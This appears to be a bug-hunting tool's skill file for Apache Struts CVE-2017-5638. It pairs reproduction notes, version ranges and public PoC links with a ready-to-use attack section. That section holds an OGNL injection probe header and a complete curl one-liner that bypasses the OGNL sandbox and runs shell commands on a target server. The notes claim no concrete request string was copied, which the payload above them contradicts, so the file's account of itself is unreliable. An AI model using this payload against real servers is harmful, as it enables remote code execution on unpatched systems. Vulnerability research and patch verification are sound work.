---
# bughive-repro-start
cve: CVE-2017-5638
repro: verified-public
references:
  - source: nvd
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2017-5638"
    gave: "descriptions, configurations, 18 Exploit-tagged refs"
  - source: vendor
    url: "https://cwiki.apache.org/confluence/display/WW/S2-045"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    url: "https://github.com/advisories/GHSA-j77q-2qqg-6989"
    gave: "package range, first_patched_version, references"
  - source: cisa-kev
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/webapps/41570.py"
    gave: "public PoC (EDB-41570)"
  - source: poc-in-github
    url: "https://github.com/mazen160/struts-pwn"
    gave: "public PoC repository"
# bughive-repro-end
---

# SKILL: apache-struts
## Paths
*.action, *.do, *.jsp, *.struts, *.java, *.out, *.bat, *.seam, *.sh, *.bson, *.el, *.pm
## Probe (CVE-2017-5638): header reflects "bughive: 16" -> OGNL executes
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('bughive',4*4)}.multipart/form-data
## Full RCE (same CVE, sandbox bypass + exec)
curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder({'/bin/bash','-c','id'})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://target.com/home.action
## Triage
Reflection -> High. RCE -> Critical.

<!-- bughive-repro-start -->
## Steps to reproduce

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: apache struts >= 2.2.3, < 2.3.32; apache struts >= 2.5.0, < 2.5.10.1; ibm storwize_v3500_firmware 7.7.1.6. NVD lists 21 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)]
- GitHub Advisory package range: maven `org.apache.struts:struts2-core` >= 2.3.0, <= 2.3.31; first patched 2.3.32; maven `org.apache.struts:struts2-core` >= 2.5.0, <= 2.5.10; first patched 2.5.10.1. [[ghsa](https://github.com/advisories/GHSA-j77q-2qqg-6989)]
- Weakness: CWE-755. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)]

### Input / trigger
- NVD characterizes the trigger as command execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/webapps/41570.py)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as command execution. Structured affected range: apache struts >= 2.2.3, < 2.3.32. GHSA first patched version: 2.3.32. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)] [[ghsa](https://github.com/advisories/GHSA-j77q-2qqg-6989)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/webapps/41570.py)]

### Public PoC (if any)
- EDB-41570 (verified flag 1): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/webapps/41570.py
- EDB-41614 (verified flag 1): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/remote/41614.rb
- GHSA-listed: https://exploit-db.com/exploits/41570
- GHSA-listed: https://packetstormsecurity.com/files/141494/S2-45-poc.py.txt
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/mazen160/struts-pwn
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2017/CVE-2017-5638.json
- NVD Exploit-tagged reference: http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
- NVD Exploit-tagged reference: http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-5638-apache-struts-vulnerability-remote-code-execution/

### What's missing
- (none for verified-public)
<!-- bughive-repro-end -->
